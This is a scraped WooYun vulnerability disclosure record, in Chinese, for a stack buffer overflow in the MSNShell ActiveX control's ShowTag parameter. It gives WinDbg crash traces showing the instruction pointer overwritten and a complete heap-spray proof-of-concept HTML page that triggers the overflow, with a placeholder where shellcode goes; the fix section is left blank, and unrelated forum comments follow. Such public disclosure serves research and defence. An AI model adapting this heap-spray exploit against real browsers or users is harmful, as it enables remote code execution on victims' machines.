{"id": 24170, "wybug_id": "wooyun-2010-0570", "wybug_title": "msnshell远程代码执行漏洞", "wybug_corp": "msnshell", "wybug_author": "疯狗", "wybug_date": "2010-09-17 20:01", "wybug_open_date": "2010-09-18 11:49", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["边界越位", "缓冲区溢出", "浏览器插件漏洞", "漏洞", "栈溢出", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-09-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-09-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： msnshell是国内一款多功能的msn辅助工具，有着方便而强大聊天加密功能，使其用户群非常广泛，但是该应用有一些已存在多年的远程代码执行漏洞。 详细说明：  问题出在msnshell的activex控件上ClassID : 20FD1EBC-A607-4C18-9F18-0233EF4D7234File : MSNShellSDK.dllShowTag以及其他部分参数对数据长度的过滤不足，当长度为540字节左右的时候造成缓冲区溢出，控制程序流程。PS:不只是这一个参数有漏洞！\n7C923297    FF75 14         push    dword ptr [ebp+14]7C92329A    FF75 10         push    dword ptr [ebp+10]7C92329D    FF75 0C         push    dword ptr [ebp+C]7C9232A0    FF75 08         push    dword ptr [ebp+8]7C9232A3    8B4D 18         mov     ecx, dword ptr [ebp+18]7C9232A6    FFD1            call    ecx   <-- exploit it!7C9232A8    64:8B25 0000000>mov     esp, dword ptr fs:[0]7C9232AF    64:8F05 0000000>pop     dword ptr fs:[0]7C9232B6    8BE5            mov     esp, ebp7C9232B8    5D              pop     ebp7C9232B9    C2 1400         retn    14eax=7ffd3000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005eip=7c92120e esp=0118ffcc ebp=0118fff4 iopl=0         nv up ei pl zr na po nccs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\ntdll.dll -ntdll!DbgBreakPoint:7c92120e cc               int     30:007> gurl:ModLoad: 753b0000 75421000   C:\\WINDOWS\\system32\\mshtmled.dllurl:ModLoad: 76320000 76367000   C:\\WINDOWS\\system32\\comdlg32.dllModLoad: 76960000 76984000   C:\\WINDOWS\\system32\\ntshrui.dllModLoad: 76af0000 76b01000   C:\\WINDOWS\\system32\\ATL.DLLModLoad: 759d0000 75a7f000   C:\\WINDOWS\\system32\\USERENV.dllModLoad: 76950000 76958000   C:\\WINDOWS\\system32\\LINKINFO.dllurl:ModLoad: 76b10000 76b3a000   C:\\WINDOWS\\system32\\WINMM.dllModLoad: 5dba0000 5dba8000   C:\\WINDOWS\\system32\\rdpsnd.dllModLoad: 762d0000 762e0000   C:\\WINDOWS\\system32\\WINSTA.dllModLoad: 76f20000 76f28000   C:\\WINDOWS\\system32\\Wtsapi32.dllModLoad: 72c80000 72c88000   C:\\WINDOWS\\system32\\msacm32.drvModLoad: 77bb0000 77bc5000   C:\\WINDOWS\\system32\\MSACM32.dllModLoad: 03070000 0311f000   C:\\PROGRA~1\\MSNShell\\BIN\\MSNSHE~1.DLLModLoad: 5efe0000 5eff7000   C:\\WINDOWS\\system32\\olepro32.dllModLoad: 75bc0000 75c3d000   C:\\WINDOWS\\system32\\JScript.dllAccess violation - code c0000005 (first chance)eax=41414141 ebx=41414141 ecx=00000000 edx=41414141 esi=0012dfc8 edi=00000000eip=030746b0 esp=0012dea8 ebp=0012e0d4 iopl=0         nv up ei pl nz na po nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\PROGRA~1\\MSNShell\\BIN\\MSNSHE~1.DLL -MSNSHE~1+46b0:030746b0 8b40fc           mov     eax,[eax-0x4]     ds:0023:4141413d=????????0:000> gAccess violation - code c0000005 (first chance)eax=00000000 ebx=00000000 ecx=41414141 edx=7c9232bc esi=00000000 edi=00000000eip=41414141 esp=0012dad8 ebp=0012daf8 iopl=0         nv up ei pl zr na po nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=0001024641414141 ??               ???0:000> d eip41414141  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????41414151  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????41414161  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????41414171  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????41414181  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????41414191  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????414141a1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????414141b1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????0:000>\n\n\n   漏洞证明：  POC很简单，让程序call到0x0c0c0c0c去，使用堆喷射技术即可。\n<html><object classid=\"clsid:BFB06F62-190C-42F6-91B1-3CB03560FE2D\" id='target'></object><body><SCRIPT language=\"JavaScript\">var shellcode = unescape(\"you shellcode is here\");var bigblock = unescape(\"%u0C0C%u0C0C\");var headersize = 20;var slackspace = headersize+shellcode.length;while (bigblock.length<slackspace) bigblock+=bigblock;fillblock = bigblock.substring(0, slackspace);block = bigblock.substring(0, bigblock.length-slackspace);while(block.length+slackspace<0x40000) block = block+block+fillblock;memory = new Array();for (x=0; x<350; x++) memory[x] = block +shellcode;var buffer = '';while (buffer.length < 540 ) buffer+='\\x0C\\x0C\\x0C\\x0C';target.ShowTag(buffer);</script></body></html>\n   修复方案：  you know.   版权声明：转载请注明来源 疯狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-10-26 19:12 |    \t\tClouds \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:12        | test)\t\t \n  test    \n     2013-07-31 17:22 |    \t\tdir \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | http://www.wooyun.org/)\t\t \n  膜拜。。。。    \n     2014-04-28 18:21 |    \t\t伟哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:29        | 不怕流氓有文化,就怕色狼有耐心,那么一只起...)\t\t \n  膜拜！    \n     2014-08-02 16:20 |    \t\tMirror \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | ->_->)\t\t \n  膜拜    \n     2015-02-03 18:00 |    \t\tMr.Q \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:51        | hulala)\t\t \n  @疯狗 狗哥 麻烦提醒车讯网 确认漏洞 他们家的所有漏洞都被他们忽略了    \n     2015-02-03 18:50 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Mr.Q 好的，邮件跟接口人联系提醒一下。    \n     2015-02-05 12:28 |    \t\tMr.Q \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:51        | hulala)\t\t \n  @疯狗 狗哥 厂商 车讯网依旧对漏洞置若罔闻 醉了    \n     2015-02-11 15:34 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  @Mr.Q 文化人    \n     2015-02-11 17:48 |    \t\tMr.Q \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:51        | hulala)\t\t \n  @蛇精病 求不黑啊 车讯网那厂商所有漏洞全忽略 还不给补rank T-T    \n     2015-04-13 16:12 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  @疯狗 狗哥我刚提交的漏洞不见了是怎么回事啊？在“待审核”“已通过”“未通过”中都找不着了……    \n     2015-09-07 09:12 |    \t\t老实先生 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        | 早日告别路人状态)\t\t \n  @疯狗 请问你是原来77169的站长吗？    \n     2015-09-13 15:04 |    \t\txk0n \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | ..)\t\t \n  @疯狗  求审核我的洞啊    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}